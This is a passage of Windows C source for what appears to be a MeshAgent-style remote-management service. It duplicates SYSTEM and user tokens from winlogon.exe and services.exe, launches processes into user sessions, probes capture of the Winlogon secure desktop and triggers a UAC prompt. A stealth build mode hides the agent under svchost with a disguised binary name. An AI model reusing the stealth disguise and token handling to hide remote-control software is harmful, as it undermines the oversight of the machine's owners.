	HANDLE snapshot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32W entry;
	BOOL found = FALSE;

	if (pidOut != NULL) { *pidOut = 0; }
	if (processName == NULL || processName[0] == L'\0' || pidOut == NULL) { return FALSE; }

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) { return FALSE; }

	ZeroMemory(&entry, sizeof(entry));
	entry.dwSize = sizeof(entry);
	if (!Process32FirstW(snapshot, &entry))
	{
		CloseHandle(snapshot);
		return FALSE;
	}

	do
	{
		DWORD processSessionId = 0;
		if (_wcsicmp(entry.szExeFile, processName) != 0) { continue; }
		if (!ProcessIdToSessionId(entry.th32ProcessID, &processSessionId)) { continue; }
		if (sessionId != 0xFFFFFFFF && processSessionId != sessionId) { continue; }
		*pidOut = entry.th32ProcessID;
		found = TRUE;
		break;
	} while (Process32NextW(snapshot, &entry));

	CloseHandle(snapshot);
	return found;
}

static BOOL MeshService_OpenPrimarySystemTokenForSession(DWORD sessionId, HANDLE* tokenOut, DWORD* errorOut)
{
	const WCHAR* candidates[2] = { L"winlogon.exe", L"services.exe" };
	const DWORD candidateSessions[2] = { sessionId, 0xFFFFFFFF };
	int i = 0;

	if (tokenOut != NULL) { *tokenOut = NULL; }
	if (errorOut != NULL) { *errorOut = ERROR_SUCCESS; }
	if (tokenOut == NULL)
	{
		if (errorOut != NULL) { *errorOut = ERROR_INVALID_PARAMETER; }
		return FALSE;
	}
	if (MeshService_ProcessHasSystemSid())
	{
		HANDLE currentToken = NULL;
		HANDLE duplicatedToken = NULL;
		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, &currentToken))
		{
			if (errorOut != NULL) { *errorOut = GetLastError(); }
			return FALSE;
		}
		if (!DuplicateTokenEx(currentToken, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &duplicatedToken))
		{
			if (errorOut != NULL) { *errorOut = GetLastError(); }
			CloseHandle(currentToken);
			return FALSE;
		}
		CloseHandle(currentToken);
		if (!SetTokenInformation(duplicatedToken, TokenSessionId, &sessionId, sizeof(sessionId)))
		{
			if (errorOut != NULL) { *errorOut = GetLastError(); }
			CloseHandle(duplicatedToken);
			return FALSE;
		}
		*tokenOut = duplicatedToken;
		return TRUE;
	}

	for (i = 0; i < 2; ++i)
	{
		DWORD pid = 0;
		DWORD processSessionId = 0xFFFFFFFF;
		HANDLE processHandle = NULL;
		HANDLE processToken = NULL;
		HANDLE duplicatedToken = NULL;

		if (!MeshService_FindProcessIdByNameAndSessionW(candidates[i], candidateSessions[i], &pid)) { continue; }
		ProcessIdToSessionId(pid, &processSessionId);
		processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
		if (processHandle == NULL) { processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid); }
		if (processHandle == NULL)
		{
			if (errorOut != NULL) { *errorOut = GetLastError(); }
			continue;
		}
		if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, &processToken))
		{
			if (errorOut != NULL) { *errorOut = GetLastError(); }
			CloseHandle(processHandle);
			continue;
		}
		if (!DuplicateTokenEx(processToken, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &duplicatedToken))
		{
			if (errorOut != NULL) { *errorOut = GetLastError(); }
			CloseHandle(processToken);
			CloseHandle(processHandle);
			continue;
		}
		if (processSessionId != sessionId && !SetTokenInformation(duplicatedToken, TokenSessionId, &sessionId, sizeof(sessionId)))
		{
			if (errorOut != NULL) { *errorOut = GetLastError(); }
			CloseHandle(duplicatedToken);
			CloseHandle(processToken);
			CloseHandle(processHandle);
			continue;
		}

		CloseHandle(processToken);
		CloseHandle(processHandle);
		*tokenOut = duplicatedToken;
		return TRUE;
	}

	return FALSE;
}

static BOOL MeshService_GetLinkedPrimaryToken(DWORD sessionId, HANDLE* tokenOut, DWORD* errorOut)
{
	HANDLE currentToken = NULL;
	HANDLE userToken = NULL;
	HANDLE sourceToken = NULL;
	TOKEN_LINKED_TOKEN linkedToken;
	TOKEN_ELEVATION_TYPE elevationType = TokenElevationTypeDefault;
	DWORD bytesReturned = 0;
	HANDLE duplicatedToken = NULL;

	if (tokenOut != NULL) { *tokenOut = NULL; }
	if (errorOut != NULL) { *errorOut = ERROR_SUCCESS; }
	if (tokenOut == NULL)
	{
		if (errorOut != NULL) { *errorOut = ERROR_INVALID_PARAMETER; }
		return FALSE;
	}
	if (MeshService_ProcessHasSystemSid())
	{
		if (!WTSQueryUserToken(sessionId, &userToken))
		{
			if (errorOut != NULL) { *errorOut = GetLastError(); }
			return FALSE;
		}
		sourceToken = userToken;
		ZeroMemory(&linkedToken, sizeof(linkedToken));
		if (GetTokenInformation(userToken, TokenElevationType, &elevationType, sizeof(elevationType), &bytesReturned) &&
			elevationType == TokenElevationTypeFull &&
			GetTokenInformation(userToken, TokenLinkedToken, &linkedToken, sizeof(linkedToken), &bytesReturned))
		{
			sourceToken = linkedToken.LinkedToken;
		}
		if (!DuplicateTokenEx(sourceToken, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &duplicatedToken))
		{
			if (errorOut != NULL) { *errorOut = GetLastError(); }
			if (sourceToken != NULL && sourceToken != userToken) { CloseHandle(sourceToken); }
			CloseHandle(userToken);
			return FALSE;
		}
		MeshService_SetTokenIntegrityLevelToMedium(duplicatedToken);
		if (sourceToken != NULL && sourceToken != userToken) { CloseHandle(sourceToken); }
		CloseHandle(userToken);
		*tokenOut = duplicatedToken;
		return TRUE;
	}
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &currentToken))
	{
		if (errorOut != NULL) { *errorOut = GetLastError(); }
		return FALSE;
	}
	ZeroMemory(&linkedToken, sizeof(linkedToken));
	if (!GetTokenInformation(currentToken, TokenLinkedToken, &linkedToken, sizeof(linkedToken), &bytesReturned))
	{
		if (errorOut != NULL) { *errorOut = GetLastError(); }
		CloseHandle(currentToken);
		return FALSE;
	}
	CloseHandle(currentToken);

	if (!DuplicateTokenEx(linkedToken.LinkedToken, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT, NULL, SecurityImpersonation, TokenPrimary, &duplicatedToken))
	{
		if (errorOut != NULL) { *errorOut = GetLastError(); }
		CloseHandle(linkedToken.LinkedToken);
		return FALSE;
	}
	CloseHandle(linkedToken.LinkedToken);
	*tokenOut = duplicatedToken;
	return TRUE;
}

static BOOL MeshService_TokenHasSystemSid(HANDLE token)
{
	BOOL isSystem = FALSE;
	DWORD tokenSize = 0;
	TOKEN_USER* tokenUser = NULL;
	PSID localSystemSid = NULL;
	SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;

	if (token == NULL) { return FALSE; }
	GetTokenInformation(token, TokenUser, NULL, 0, &tokenSize);
	if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
	{
		return FALSE;
	}

	tokenUser = (TOKEN_USER*)ILibMemory_Allocate(tokenSize, 0, NULL, NULL);
	if (tokenUser != NULL && GetTokenInformation(token, TokenUser, tokenUser, tokenSize, &tokenSize))
	{
		if (AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &localSystemSid))
		{
			isSystem = EqualSid(tokenUser->User.Sid, localSystemSid);
			FreeSid(localSystemSid);
		}
	}
	if (tokenUser != NULL) { ILibMemory_Free(tokenUser); }
	return isSystem;
}

static BOOL MeshService_QueryTokenIntegrityRid(HANDLE token, DWORD* ridOut)
{
	DWORD tokenSize = 0;
	TOKEN_MANDATORY_LABEL* label = NULL;
	DWORD subAuthorityCount = 0;
	BOOL ok = FALSE;

	if (ridOut != NULL) { *ridOut = 0; }
	if (token == NULL || ridOut == NULL) { return FALSE; }

	GetTokenInformation(token, TokenIntegrityLevel, NULL, 0, &tokenSize);
	if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
	{
		return FALSE;
	}
	label = (TOKEN_MANDATORY_LABEL*)ILibMemory_Allocate(tokenSize, 0, NULL, NULL);
	if (label == NULL) { return FALSE; }
	if (GetTokenInformation(token, TokenIntegrityLevel, label, tokenSize, &tokenSize) &&
		label->Label.Sid != NULL &&
		(subAuthorityCount = *GetSidSubAuthorityCount(label->Label.Sid)) > 0)
	{
		*ridOut = *GetSidSubAuthority(label->Label.Sid, subAuthorityCount - 1);
		ok = TRUE;
	}
	ILibMemory_Free(label);
	return ok;
}

static BOOL MeshService_QueryTokenElevationTypeValue(HANDLE token, TOKEN_ELEVATION_TYPE* elevationTypeOut)
{
	DWORD bytesReturned = 0;
	TOKEN_ELEVATION_TYPE elevationType = TokenElevationTypeDefault;

	if (elevationTypeOut != NULL) { *elevationTypeOut = TokenElevationTypeDefault; }
	if (token == NULL || elevationTypeOut == NULL) { return FALSE; }
	if (!GetTokenInformation(token, TokenElevationType, &elevationType, sizeof(elevationType), &bytesReturned))
	{
		return FALSE;
	}
	*elevationTypeOut = elevationType;
	return TRUE;
}

static BOOL MeshService_QueryProcessSecurityState(DWORD pid, BOOL* systemSidOut, DWORD* integrityRidOut, TOKEN_ELEVATION_TYPE* elevationTypeOut, DWORD* sessionIdOut)
{
	HANDLE processHandle = NULL;
	HANDLE token = NULL;
	BOOL ok = FALSE;

	if (systemSidOut != NULL) { *systemSidOut = FALSE; }
	if (integrityRidOut != NULL) { *integrityRidOut = 0; }
	if (elevationTypeOut != NULL) { *elevationTypeOut = TokenElevationTypeDefault; }
	if (sessionIdOut != NULL) { *sessionIdOut = 0; }
	if (pid == 0) { return FALSE; }

	processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (processHandle == NULL) { processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid); }
	if (processHandle == NULL) { return FALSE; }
	if (!OpenProcessToken(processHandle, TOKEN_QUERY, &token))
	{
		CloseHandle(processHandle);
		return FALSE;
	}

	ok = TRUE;
	if (systemSidOut != NULL) { *systemSidOut = MeshService_TokenHasSystemSid(token); }
	if (integrityRidOut != NULL) { ok = MeshService_QueryTokenIntegrityRid(token, integrityRidOut) && ok; }
	if (elevationTypeOut != NULL) { ok = MeshService_QueryTokenElevationTypeValue(token, elevationTypeOut) && ok; }
	if (sessionIdOut != NULL)
	{
		if (!ProcessIdToSessionId(pid, sessionIdOut)) { ok = FALSE; }
	}

	CloseHandle(token);
	CloseHandle(processHandle);
	return ok;
}

static BOOL MeshService_OpenElevatedPrimaryTokenForSession(DWORD sessionId, HANDLE* tokenOut, DWORD* errorOut)
{
	HANDLE userToken = NULL;
	HANDLE sourceToken = NULL;
	HANDLE duplicatedToken = NULL;
	TOKEN_LINKED_TOKEN linkedToken;
	TOKEN_ELEVATION_TYPE elevationType = TokenElevationTypeDefault;
	DWORD bytesReturned = 0;
	DWORD integrityRid = 0;
	BOOL ok = FALSE;

	if (tokenOut != NULL) { *tokenOut = NULL; }
	if (errorOut != NULL) { *errorOut = ERROR_SUCCESS; }
	if (tokenOut == NULL)
	{
		if (errorOut != NULL) { *errorOut = ERROR_INVALID_PARAMETER; }
		return FALSE;
	}
	if (!WTSQueryUserToken(sessionId, &userToken))
	{
		if (errorOut != NULL) { *errorOut = GetLastError(); }
		return FALSE;
	}

	sourceToken = userToken;
	ZeroMemory(&linkedToken, sizeof(linkedToken));
	if (GetTokenInformation(userToken, TokenElevationType, &elevationType, sizeof(elevationType), &bytesReturned) &&
		elevationType == TokenElevationTypeLimited &&
		GetTokenInformation(userToken, TokenLinkedToken, &linkedToken, sizeof(linkedToken), &bytesReturned))
	{
		sourceToken = linkedToken.LinkedToken;
	}

	ok = DuplicateTokenEx(
		sourceToken,
		TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
		NULL,
		SecurityImpersonation,
		TokenPrimary,
		&duplicatedToken);
	if (!ok)
	{
		if (errorOut != NULL) { *errorOut = GetLastError(); }
		if (sourceToken != NULL && sourceToken != userToken) { CloseHandle(sourceToken); }
		CloseHandle(userToken);
		return FALSE;
	}
	if (!SetTokenInformation(duplicatedToken, TokenSessionId, &sessionId, sizeof(sessionId)))
	{
		if (errorOut != NULL) { *errorOut = GetLastError(); }
		CloseHandle(duplicatedToken);
		if (sourceToken != NULL && sourceToken != userToken) { CloseHandle(sourceToken); }
		CloseHandle(userToken);
		return FALSE;
	}
	if (!MeshService_QueryTokenIntegrityRid(duplicatedToken, &integrityRid) || integrityRid < SECURITY_MANDATORY_HIGH_RID)
	{
		if (errorOut != NULL) { *errorOut = ERROR_PRIVILEGE_NOT_HELD; }
		CloseHandle(duplicatedToken);
		if (sourceToken != NULL && sourceToken != userToken) { CloseHandle(sourceToken); }
		CloseHandle(userToken);
		return FALSE;
	}

	if (sourceToken != NULL && sourceToken != userToken) { CloseHandle(sourceToken); }
	CloseHandle(userToken);
	*tokenOut = duplicatedToken;
	return TRUE;
}

static BOOL MeshService_SpawnExecutableWithTokenW(HANDLE token, const WCHAR* executablePath, const WCHAR* arguments, const WCHAR* desktop, PROCESS_INFORMATION* processInfo, DWORD* errorOut)
{
	STARTUPINFOW startupInfo;
	WCHAR commandLine[4096] = { 0 };
	BOOL ok = FALSE;
	DWORD createFlags = CREATE_NO_WINDOW;

	if (errorOut != NULL) { *errorOut = ERROR_SUCCESS; }
	if (token == NULL || processInfo == NULL)
	{
		if (errorOut != NULL) { *errorOut = ERROR_INVALID_PARAMETER; }
		return FALSE;
	}
	ZeroMemory(processInfo, sizeof(PROCESS_INFORMATION));
	if (executablePath == NULL || executablePath[0] == L'\0')
	{
		if (errorOut != NULL) { *errorOut = ERROR_INVALID_PARAMETER; }
		return FALSE;
	}
	if (arguments != NULL && arguments[0] != L'\0')
	{
		if (FAILED(StringCchPrintfW(commandLine, _countof(commandLine), L"\"%ls\" %ls", executablePath, arguments)))
		{
			if (errorOut != NULL) { *errorOut = ERROR_INSUFFICIENT_BUFFER; }
			return FALSE;
		}
	}
	else
	{
		if (FAILED(StringCchPrintfW(commandLine, _countof(commandLine), L"\"%ls\"", executablePath)))
		{
			if (errorOut != NULL) { *errorOut = ERROR_INSUFFICIENT_BUFFER; }
			return FALSE;
		}
	}

	ZeroMemory(&startupInfo, sizeof(startupInfo));
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.lpDesktop = (LPWSTR)((desktop != NULL && desktop[0] != L'\0') ? desktop : L"winsta0\\default");

	ok = CreateProcessAsUserW(token, executablePath, commandLine, NULL, NULL, FALSE, createFlags, NULL, NULL, &startupInfo, processInfo);
	if (!ok)
	{
		ok = CreateProcessWithTokenW(token, LOGON_WITH_PROFILE, executablePath, commandLine, createFlags, NULL, NULL, &startupInfo, processInfo);
	}
	if (!ok && errorOut != NULL) { *errorOut = GetLastError(); }
	return ok;
}

static BOOL MeshService_SpawnVisibleExecutableWithTokenW(HANDLE token, const WCHAR* executablePath, const WCHAR* arguments, const WCHAR* desktop, PROCESS_INFORMATION* processInfo, DWORD* errorOut)
{
	STARTUPINFOW startupInfo;
	WCHAR commandLine[4096] = { 0 };
	BOOL ok = FALSE;
	DWORD createFlags = CREATE_NEW_CONSOLE;

	if (errorOut != NULL) { *errorOut = ERROR_SUCCESS; }
	if (token == NULL || processInfo == NULL)
	{
		if (errorOut != NULL) { *errorOut = ERROR_INVALID_PARAMETER; }
		return FALSE;
	}
	ZeroMemory(processInfo, sizeof(PROCESS_INFORMATION));
	if (executablePath == NULL || executablePath[0] == L'\0')
	{
		if (errorOut != NULL) { *errorOut = ERROR_INVALID_PARAMETER; }
		return FALSE;
	}
	if (arguments != NULL && arguments[0] != L'\0')
	{
		if (FAILED(StringCchPrintfW(commandLine, _countof(commandLine), L"\"%ls\" %ls", executablePath, arguments)))
		{
			if (errorOut != NULL) { *errorOut = ERROR_INSUFFICIENT_BUFFER; }
			return FALSE;
		}
	}
	else
	{
		if (FAILED(StringCchPrintfW(commandLine, _countof(commandLine), L"\"%ls\"", executablePath)))
		{
			if (errorOut != NULL) { *errorOut = ERROR_INSUFFICIENT_BUFFER; }
			return FALSE;
		}
	}

	ZeroMemory(&startupInfo, sizeof(startupInfo));
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.lpDesktop = (LPWSTR)((desktop != NULL && desktop[0] != L'\0') ? desktop : L"winsta0\\default");
	startupInfo.dwFlags = STARTF_USESHOWWINDOW;
	startupInfo.wShowWindow = SW_SHOWNORMAL;

	ok = CreateProcessAsUserW(token, executablePath, commandLine, NULL, NULL, FALSE, createFlags, NULL, NULL, &startupInfo, processInfo);
	if (!ok)
	{
		ok = CreateProcessWithTokenW(token, LOGON_WITH_PROFILE, executablePath, commandLine, createFlags, NULL, NULL, &startupInfo, processInfo);
	}
	if (!ok && errorOut != NULL) { *errorOut = GetLastError(); }
	return ok;
}

static BOOL MeshService_ResolveHostExecutablePathW(WCHAR* outputPath, size_t outputCount)
{
	if (outputPath == NULL || outputCount == 0) { return FALSE; }
	outputPath[0] = L'\0';

#if defined(MESHAGENT_ENABLE_STEALTH) && defined(MESH_AGENT_SVCHOST_MODE) && (MESH_AGENT_SVCHOST_MODE != 0)
	{
		WCHAR currentProcessPath[MAX_PATH] = { 0 };
		const WCHAR* currentProcessName = NULL;

		if (GetModuleFileNameW(NULL, currentProcessPath, (DWORD)_countof(currentProcessPath)) > 0)
		{
			currentProcessName = wcsrchr(currentProcessPath, L'\\');
			currentProcessName = (currentProcessName != NULL) ? (currentProcessName + 1) : currentProcessPath;
			if (currentProcessName != NULL && _wcsicmp(currentProcessName, L"svchost.exe") != 0)
			{
				return SUCCEEDED(StringCchCopyW(outputPath, outputCount, currentProcessPath));
			}
		}
	}

	// In svchost mode, GetModuleFileNameW(NULL) returns svchost.exe. 
	// We need to resolve the branded agent binary (e.g. diaghost.exe) instead.
	HMODULE hMod = NULL;
	WCHAR modulePath[MAX_PATH] = { 0 };
	if (GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCWSTR)&MeshService_ResolveHostExecutablePathW, &hMod) &&
		GetModuleFileNameW(hMod, modulePath, _countof(modulePath)) > 0)
	{
		wchar_t* lastSlash = wcsrchr(modulePath, L'\\');
		if (lastSlash != NULL)
		{
			*lastSlash = L'\0';
			wchar_t brandedName[MAX_PATH] = { 0 };
			MeshService_CopyBrandingTextToWide(MeshService_GetBinaryNameText(), brandedName, _countof(brandedName));
			if (brandedName[0] == L'\0') { StringCchCopyW(brandedName, _countof(brandedName), STEALTH_FALLBACK_EXE_NAME); }

			wchar_t candidate[MAX_PATH] = { 0 };
			if (SUCCEEDED(StringCchPrintfW(candidate, _countof(candidate), L"%ls\\%ls", modulePath, brandedName)) &&
				GetFileAttributesW(candidate) != INVALID_FILE_ATTRIBUTES)
			{
				StringCchCopyW(outputPath, outputCount, candidate);
				return TRUE;
			}
			
			// If branded name fails, try the fallback name explicitly
			if (SUCCEEDED(StringCchPrintfW(candidate, _countof(candidate), L"%ls\\%ls", modulePath, STEALTH_FALLBACK_EXE_NAME)) &&
				GetFileAttributesW(candidate) != INVALID_FILE_ATTRIBUTES)
			{
				StringCchCopyW(outputPath, outputCount, candidate);
				return TRUE;
			}
		}
	}
	
	// If we are in stealth build but cannot find the agent binary, DO NOT return svchost.exe
	// as it will cause a fork bomb when used with the watchdog.
	return FALSE;
#else
	return GetModuleFileNameW(NULL, outputPath, (DWORD)outputCount) != 0;
#endif
}

static BOOL MeshService_SpawnProcessWithTokenW(HANDLE token, const WCHAR* arguments, const WCHAR* desktop, PROCESS_INFORMATION* processInfo, DWORD* errorOut)
{
	WCHAR exePath[MAX_PATH * 2] = { 0 };

	if (!MeshService_ResolveHostExecutablePathW(exePath, _countof(exePath)))
	{
		if (errorOut != NULL) { *errorOut = GetLastError(); }
		return FALSE;
	}
	return MeshService_SpawnExecutableWithTokenW(token, exePath, arguments, desktop, processInfo, errorOut);
}

static BOOL MeshService_TerminateProcessesByNameInSessionW(const WCHAR* processName, DWORD sessionId, DWORD* terminatedCountOut)
{
	HANDLE snapshot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32W entry;
	DWORD terminatedCount = 0;

	if (terminatedCountOut != NULL) { *terminatedCountOut = 0; }
	if (processName == NULL || processName[0] == L'\0') { return FALSE; }

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) { return FALSE; }

	ZeroMemory(&entry, sizeof(entry));
	entry.dwSize = sizeof(entry);
	if (!Process32FirstW(snapshot, &entry))
	{
		CloseHandle(snapshot);
		return FALSE;
	}

	do
	{
		DWORD processSessionId = 0;
		HANDLE processHandle = NULL;

		if (_wcsicmp(entry.szExeFile, processName) != 0) { continue; }
		if (!ProcessIdToSessionId(entry.th32ProcessID, &processSessionId) || processSessionId != sessionId) { continue; }

		processHandle = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, entry.th32ProcessID);
		if (processHandle == NULL) { continue; }
		if (TerminateProcess(processHandle, 1))
		{
			++terminatedCount;
			WaitForSingleObject(processHandle, 5000);
		}
		CloseHandle(processHandle);
	} while (Process32NextW(snapshot, &entry));

	CloseHandle(snapshot);
	if (terminatedCountOut != NULL) { *terminatedCountOut = terminatedCount; }
	return (terminatedCount > 0);
}

static void MeshService_EnableKvmDpiAwareness(void)
{
	HMODULE shcore = LoadLibraryExA((LPCSTR)"Shcore.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
	DpiAwarenessFunc dpiAwareness = NULL;

	if (shcore != NULL)
	{
		dpiAwareness = (DpiAwarenessFunc)GetProcAddress(shcore, (LPCSTR)"SetProcessDpiAwareness");
	}
	if (dpiAwareness != NULL)
	{
		dpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE);
		FreeLibrary(shcore);
	}
	else
	{
		if (shcore != NULL) { FreeLibrary(shcore); }
		SetProcessDPIAware();
	}
}

static void MeshService_SecureDesktopProbeSnapshotDesktop(MeshServiceSecureDesktopProbeState* state)
{
	const char* desktopName = NULL;

	if (state == NULL) { return; }
	desktopName = kvm_get_current_desktop_name();
	if (desktopName == NULL || desktopName[0] == '\0') { return; }
	if (state->initialDesktop[0] == '\0')
	{
		StringCchCopyA(state->initialDesktop, _countof(state->initialDesktop), desktopName);
	}
	StringCchCopyA(state->finalDesktop, _countof(state->finalDesktop), desktopName);
}

static ILibTransport_DoneState MeshService_KvmSecureDesktopWriteSink(char* buffer, int bufferLen, void* reserved)
{
	MeshServiceSecureDesktopProbeState* state = (MeshServiceSecureDesktopProbeState*)reserved;
	unsigned short type = 0;

	if (state == NULL || buffer == NULL || bufferLen < 4) { return ILibTransport_DoneState_COMPLETE; }
	type = ntohs(((unsigned short*)buffer)[0]);
	MeshService_SecureDesktopProbeSnapshotDesktop(state);
	if (type == 7 || type == 27)
	{
		InterlockedIncrement(&state->screenPackets);
		if (_stricmp(kvm_get_current_desktop_name(), "Winlogon") == 0)
		{
			if (state->firstWinlogonTick == 0) { state->firstWinlogonTick = GetTickCount64(); }
			InterlockedIncrement(&state->winlogonScreenPackets);
			g_shutdown = 1;
		}
	}
	else if (type == 82 || type == 11)
	{
		InterlockedIncrement(&state->displayPackets);
	}
	return ILibTransport_DoneState_COMPLETE;
}

static DWORD WINAPI MeshService_KvmSecureDesktopTimeoutThread(LPVOID user)
{
	MeshServiceSecureDesktopProbeState* state = (MeshServiceSecureDesktopProbeState*)user;
	if (state == NULL) { return 0; }
	Sleep(state->timeoutMs);
	g_shutdown = 1;
	return 0;
}

static int MeshService_RunKvmSecureDesktopProbeChildCommand(const WCHAR* reportPath, DWORD timeoutMs)
{
	MeshServiceSecureDesktopProbeState state;
	void** parm = NULL;
	HANDLE timeoutThread = NULL;
	FILE* file = NULL;
	errno_t fileErr = 0;
	BOOL success = FALSE;
	const char* backendName = NULL;
	const char* backendReason = NULL;
	ULONGLONG elapsedMs = 0;

	ZeroMemory(&state, sizeof(state));
	state.timeoutMs = (timeoutMs == 0) ? 20000 : timeoutMs;
	state.startedTick = GetTickCount64();

	MeshService_EnableKvmDpiAwareness();
	kvmConsoleMode = 1;

	parm = (void**)ILibMemory_Allocate(4 * sizeof(void*), 0, 0, NULL);
	parm[0] = MeshService_KvmSecureDesktopWriteSink;
	parm[1] = &state;
	((int*)&(parm[2]))[0] = 1;
	((int*)&(parm[3]))[0] = 0;

	timeoutThread = CreateThread(NULL, 0, MeshService_KvmSecureDesktopTimeoutThread, &state, 0, 0);
	kvm_server_mainloop(parm);
	if (timeoutThread != NULL)
	{
		WaitForSingleObject(timeoutThread, 100);
		CloseHandle(timeoutThread);
	}

	MeshService_SecureDesktopProbeSnapshotDesktop(&state);
	backendName = get_capture_backend_name();
	backendReason = get_capture_backend_reason();
	elapsedMs = GetTickCount64() - state.startedTick;
	success = (state.winlogonScreenPackets > 0);

	if (reportPath != NULL && reportPath[0] != L'\0')
	{
		fileErr = _wfopen_s(&file, reportPath, L"wb");
		if (fileErr == 0 && file != NULL)
		{
			fprintf(file, "{\"success\":%s,", success ? "true" : "false");
			fprintf(file, "\"systemSid\":%s,", MeshService_ProcessHasSystemSid() ? "true" : "false");
			fprintf(file, "\"screenPackets\":%ld,", state.screenPackets);
			fprintf(file, "\"displayPackets\":%ld,", state.displayPackets);
			fprintf(file, "\"winlogonScreenPackets\":%ld,", state.winlogonScreenPackets);
			fprintf(file, "\"elapsedMs\":%llu,", (unsigned long long)elapsedMs);
			fprintf(file, "\"initialDesktop\":\""); MeshService_FilePrintJsonEscapedUtf8(file, state.initialDesktop); fprintf(file, "\",");
			fprintf(file, "\"finalDesktop\":\""); MeshService_FilePrintJsonEscapedUtf8(file, state.finalDesktop); fprintf(file, "\",");
			fprintf(file, "\"backend\":\""); MeshService_FilePrintJsonEscapedUtf8(file, backendName != NULL ? backendName : ""); fprintf(file, "\",");
			fprintf(file, "\"reason\":\""); MeshService_FilePrintJsonEscapedUtf8(file, backendReason != NULL ? backendReason : ""); fprintf(file, "\"}\n");
			fclose(file);
		}
	}
	return success ? 0 : 1;
}

static int MeshService_RunKvmUacConsentTargetCommand(DWORD sleepMs, const WCHAR* reportPath)
{
	FILE* file = NULL;
	errno_t fileErr = 0;

	if (reportPath != NULL && reportPath[0] != L'\0')
	{
		fileErr = _wfopen_s(&file, reportPath, L"wb");
		if (fileErr == 0 && file != NULL)
		{
			fprintf(file, "{\"success\":true,\"sleepMs\":%lu}\n", (unsigned long)(sleepMs == 0 ? 1000 : sleepMs));
			fclose(file);
		}
	}
	Sleep(sleepMs == 0 ? 1000 : sleepMs);
	return 0;
}

static int MeshService_RunKvmUacConsentTriggerCommand(const WCHAR* reportPath, DWORD timeoutMs)
{
	SHELLEXECUTEINFOW executeInfo;
	WCHAR exePath[MAX_PATH * 2] = { 0 };
	WCHAR parameters[256] = { 0 };
	FILE* file = NULL;
	errno_t fileErr = 0;
	BOOL ok = FALSE;
	DWORD error = ERROR_SUCCESS;
	DWORD exitCode = STILL_ACTIVE;
	DWORD childPid = 0;
	ULONGLONG startedTick = GetTickCount64();
	ULONGLONG elapsedMs = 0;

	GetModuleFileNameW(NULL, exePath, (DWORD)_countof(exePath));
	StringCchPrintfW(parameters, _countof(parameters), L"-kvm-uac-consent-target %lu", (unsigned long)((timeoutMs == 0) ? 15000 : timeoutMs));

	ZeroMemory(&executeInfo, sizeof(executeInfo));
	executeInfo.cbSize = sizeof(executeInfo);
	executeInfo.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
	executeInfo.lpVerb = L"runas";
	executeInfo.lpFile = exePath;
	executeInfo.lpParameters = parameters;
	executeInfo.nShow = SW_HIDE;

	ok = ShellExecuteExW(&executeInfo);
	error = ok ? ERROR_SUCCESS : GetLastError();
	if (ok && executeInfo.hProcess != NULL)
	{
		childPid = GetProcessId(executeInfo.hProcess);
		WaitForSingleObject(executeInfo.hProcess, timeoutMs == 0 ? 15000 : timeoutMs);
		GetExitCodeProcess(executeInfo.hProcess, &exitCode);
		CloseHandle(executeInfo.hProcess);
	}
	elapsedMs = GetTickCount64() - startedTick;

	if (reportPath != NULL && reportPath[0] != L'\0')
	{
		fileErr = _wfopen_s(&file, reportPath, L"wb");
		if (fileErr == 0 && file != NULL)
		{
			fprintf(file, "{\"success\":%s,", ok ? "true" : "false");
			fprintf(file, "\"error\":%lu,", (unsigned long)error);
			fprintf(file, "\"childPid\":%lu,", (unsigned long)childPid);
			fprintf(file, "\"exitCode\":%lu,", (unsigned long)exitCode);
			fprintf(file, "\"elapsedMs\":%llu}\n", (unsigned long long)elapsedMs);
			fclose(file);
		}
	}
	return ok ? 0 : 1;
}

static int MeshService_RunKvmSecureDesktopProbeCommand(void)
{
	WCHAR childReport[MAX_PATH] = { 0 };
	WCHAR uacReport[MAX_PATH] = { 0 };
